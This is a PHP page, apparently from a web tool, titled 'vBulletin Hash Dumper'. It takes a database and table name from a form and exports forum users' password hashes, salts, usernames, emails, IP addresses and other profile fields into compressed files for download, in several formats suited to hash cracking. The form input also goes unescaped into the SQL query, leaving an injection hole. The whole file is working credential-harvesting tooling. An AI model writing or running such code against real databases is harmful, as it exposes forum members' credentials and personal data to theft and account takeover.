<link rel="stylesheet" href="./styles/stylesheet.css" type="text/css" />
<div id="logo">
<center><a href='./index.php'><img src="./styles/images/logo.png"></a></center>
</div><br>
<?php
if (!file_exists('./includes/configuration.php')) {
    echo "<script>window.location = './install.php';</script>";
    exit;
}
require_once ("./includes/functions.php");
if (isset($_POST['dump_hashes'])) {
    $format = $_POST['format'];
    $database = $_POST['hash_db'];
    $table = $_POST['hash_table'];
    $date = date('F j, Y, g:i a');
    $query = mysql_query("SELECT * FROM $database.$table");
    $header = "This dump was taken on: $date\nFrom database: $database in table: $table\n----------------------------------------------\n";
    if ($format == "hs") {
        $file_name = $database."_hash_salt.txt";
        //Write header to file
        file_put_contents($file_name, $header);
        while ($row = mysql_fetch_array($query)) {
            $hash = $row['password'];
            $salt = $row['salt'];
            $form = "$hash:$salt\n";
            file_put_contents($file_name, $form, FILE_APPEND);
        }
        $get_file = file_get_contents($file_name);
        $gzfile = "$file_name.gz";
        $gzop = gzopen($gzfile, 'w9');
        gzwrite($gzop, $get_file);
        gzclose($gzop);
        unlink($file_name);
        Download($gzfile);
    } elseif ($format == "uhs") {
        $file_name = $database."_username_hash_salt.txt";
        //Write header to file
        file_put_contents($file_name, $header);
        while ($row = mysql_fetch_array($query)) {
            $username = $row['username'];
            $hash = $row['password'];
            $salt = $row['salt'];
            $form = "$username:$hash:$salt\n";
            file_put_contents($file_name, $form, FILE_APPEND);
        }
        $get_file = file_get_contents($file_name);
        $gzfile = "$file_name.gz";
        $gzop = gzopen($gzfile, 'w9');
        gzwrite($gzop, $get_file);
        gzclose($gzop);
        unlink($file_name);
        Download($gzfile);
    } elseif ($format == "uehs") {
        $file_name = $database."_username_email_hash_salt.txt";
        //Write header to file
        file_put_contents($file_name, $header);
        while ($row = mysql_fetch_array($query)) {
            $email = $row['email'];
            $username = $row['username'];
            $hash = $row['password'];
            $salt = $row['salt'];
            $form = "$username:$email:$hash:$salt\n";
            file_put_contents($file_name, $form, FILE_APPEND);
        }
        $get_file = file_get_contents($file_name);
        $gzfile = "$file_name.gz";
        $gzop = gzopen($gzfile, 'w9');
        gzwrite($gzop, $get_file);
        gzclose($gzop);
        unlink($file_name);
        Download($gzfile);
    } elseif ($format == "ehs") {
        $file_name = $database."_email_hash_salt.txt";
        //Write header to file
        file_put_contents($file_name, $header);
        while ($row = mysql_fetch_array($query)) {
            $email = $row['email'];
            $hash = $row['password'];
            $salt = $row['salt'];
            $form = "$email:$hash:$salt\n";
            file_put_contents($file_name, $form, FILE_APPEND);
        }
        $get_file = file_get_contents($file_name);
        $gzfile = "$file_name.gz";
        $gzop = gzopen($gzfile, 'w9');
        gzwrite($gzop, $get_file);
        gzclose($gzop);
        unlink($file_name);
        Download($gzfile);
    } elseif ($format == "ui") {
        $file_name = $database."_user_information.txt";
        //Write header to file
        file_put_contents($file_name, $header);
        while ($row = mysql_fetch_array($query)) {
            $username = $row['username'];
            $userid = $row['userid'];
            $email = $row['email'];
            $hash = $row['password'];
            $salt = $row['salt'];
            $usergroup = $row['usergroupid'];
            $usertitle = $row['usertitle'];
            $homepage = $row['homepage'];
            $ip = $row['ipaddress'];
            $form = "$username\nUser ID: $userid\nUsergroup: $usergroup\nUsertitle: $usertitle\nIP: $ip\nHomepage: $homepage\n$hash:$salt\n$email\n--------------------------------------------\n";
            file_put_contents($file_name, $form, FILE_APPEND);
        }
        $get_file = file_get_contents($file_name);
        $gzfile = "$file_name.gz";
        $gzop = gzopen($gzfile, 'w9');
        gzwrite($gzop, $get_file);
        gzclose($gzop);
        unlink($file_name);
        Download($gzfile);
    }
}
echo "<center>
vBulletin Hash Dumper
<form action='' method='post'>
<table cellpadding='15'>
<tr>
<td>Database:</td>
<td><input type='text' name='hash_db' class='regular'></td>
</tr>
<tr>
<td>User table:</td>
<td><input type='text' name='hash_table' class='regular'></td>
</tr>
<tr>
<td>Format:</td>
<td><div id='styled-select'><select name='format'><option value='hs'>Hash:salt</option><option value='uhs'>Username:hash:salt</option><option value='uehs'>Username:email:hash:salt</option><option value='ehs'>Email:hash:salt</option><option value='ui'>User info</option></div></td>
</tr>
</table><input type='submit' name='dump_hashes' value='Dump'></form></center>";
?>